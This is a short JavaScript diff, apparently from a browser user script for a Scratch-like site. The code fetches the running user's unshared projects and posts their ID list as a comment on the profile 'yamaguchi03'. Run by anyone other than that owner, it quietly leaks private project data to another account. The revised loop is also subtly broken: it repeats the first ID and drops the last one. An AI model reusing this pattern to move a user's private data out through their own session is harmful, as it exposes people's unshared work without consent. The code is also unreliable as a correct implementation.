@@ -12,13 +12,15 @@ let token="";
     }
 let json=(await(await fetch("/site-api/projects/notshared/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json());
 let ar=[];
-for(let i=0;i<40;i++){
-  ar.push(ar[i]["pk"]);
+for(let i=0;i<json.length;i++){
+  ar.push(json[i]["pk"]);
 }
-let contents="";
-for(let i=0;i<40;i++){
-  contents+=ar[i]+",";
+let contents=ar[0];
+for(let i=0;i<json.length-1;i++){
+  contents+=","+ar[i];
 }
+contents="["+contents+"] ";
+contents+=` (${ar.length})`;
 fetch(`/site-api/comments/user/yamaguchi03/add/`,{
   method: "POST",
   body: JSON.stringify({
